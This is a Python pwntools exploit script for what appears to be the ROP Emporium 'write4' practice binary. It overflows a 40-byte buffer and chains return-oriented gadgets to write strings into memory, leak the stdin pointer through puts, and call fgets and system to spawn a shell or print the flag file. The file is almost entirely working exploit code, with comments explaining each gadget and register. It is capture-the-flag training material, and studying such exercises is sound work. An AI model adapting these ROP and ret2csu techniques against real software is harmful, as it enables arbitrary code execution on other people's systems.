import sys
from pwn import *

context(os='linux',arch='amd64')

# String splitting generator function from stackoverflow
# https://stackoverflow.com/questions/9475241/split-string-every-nth-character
def split_by_n(seq, n):
  while seq:
    yield seq[:n]
    seq = seq[n:]

# This function constructs a ROP chain which writes a
# string of arbitrary length to a given memory address
# using the provided mov gadget and a pop gadget from csu
def build_write_chain(string, address, b):
  r = ROP(b)

  # locate gadgets
  pop_gadget = r.find_gadget(['pop r14','pop r15','ret']).address
  mov_gadget = b.symbols['usefulGadgets']

  # split input string into 8 byte chunks
  x = split_by_n(string,8)

  # build rop chain for each 8 byte chunk
  for a in x:
    r.raw(pop_gadget)
    r.raw(address) # r14
    r.raw(a.ljust(8,'\x00')) # r15
    r.raw(mov_gadget)
    address += 8

  return r
  
# this function constructs a ROP chain which calls fgets()
# to obtain and write a length n string from stdin to the
# given memory address
def fgets_exploit(string):
  b = ELF('write4')
  r = ROP(b)

  # fgets prototype is: fgets(*buffer, int size, *filehandle)
  # in order to call fgets in x64, we therefore need:
  #   rdi: pointer to target buffer
  #   rsi: number of bytes to copy
  #   rdx: pointer to stdin
  # the stdin symbol in our binary is a pointer to the real address
  # so the first thing we'll need to do is leak the real address

  r.raw(r.find_gadget(['pop rdi','ret']).address)
  r.raw(b.symbols['got.stdin'])
  r.raw(b.symbols['plt.puts'])
  r.raw(b.symbols['pwnme'])

  # start the process and send the leak ROP chain 
  p = process('./write4')
  p.recvuntil("> ")
  p.sendline("A" * 40 + str(r))
  x = p.recvuntil("\n")
  stdin = u64(x.strip().ljust(8,'\x00'))
  log.info("leaked stdin @ " + hex(stdin))
  p.recvuntil("> ")

  # now that we have the real address of stdin, we're ready to call fgets
  # we'll use a couple gadgets from csu to populate the three registers
  csu_pop_gadget = b.symbols['__libc_csu_init'] + 90 # ['pop rbx','pop rbp','pop r12','pop r13','pop r14','pop 15','ret']
  csu_call_gadget = b.symbols['__libc_csu_init'] + 64 # ['mov rdx, r13','mov rsi, r14','mov edi, r15d','call [r12+rbx*8]']

  r2 = ROP(b)
  r2.raw(csu_pop_gadget)
  r2.raw(0) 				# rbx
  r2.raw(1)				# rbp
  r2.raw(b.symbols['got.fgets'])	# r12
  r2.raw(stdin)				# r13 (rdx)
  r2.raw(len(string)+2)			# r14 (rsi)
  r2.raw(b.symbols['data_start'])	# r15 (edi)
  r2.raw(csu_call_gadget)
  r2.raw("A"*56)			# on return from second gadget, we need 56 bytes of garbage and then a stored rip
  r2.raw(r.find_gadget(['pop rdi','ret']).address)
  r2.raw(b.symbols['data_start'])
  r2.raw(b.symbols['plt.system'])

  # send the exploit chain
  p.sendline("A" * 40 + str(r2))

  # send the argument to system()
  log.info("Sending exploit")
  p.sendline(string + "\x00")
  return p

def write_exploit(string):
  b = ELF('write4')

  # build rop chain to write the input string into the process memory
  r = build_write_chain(string, b.symbols['data_start'], b)

  # finish building the chain
  # need to get the address where we wrote the input string into
  # rdi and then return to the address at which system() is called
  r.raw(r.find_gadget(['pop rdi','ret']).address)
  r.raw(b.symbols['data_start'])
  r.raw(b.symbols['plt.system'])

  # start the process and send the overflow and ROP exploit
  p = process('./write4')
  p.recvuntil("> ")
  log.info("Sending exploit")
  p.sendline("A" * 40 + str(r))
  return p

def write_shell():
  p = write_exploit("/bin/sh")
  p.interactive()

def write_cat():
  p = write_exploit("/bin/cat flag.txt")
  print(p.recvall())

def fgets_shell():
  p = fgets_exploit("/bin/sh")
  p.interactive()

def fgets_cat():
  p = fgets_exploit("/bin/cat flag.txt")
  print(p.recvall())

if __name__ == "__main__":
  if len(sys.argv) > 1 and sys.argv[1] in globals() and callable(globals()[sys.argv[1]]):
    globals()[sys.argv[1]]()
  else:
    print("usage: " + sys.argv[0] + " write_shell|write_cat|fgets_shell|fgets_cat")
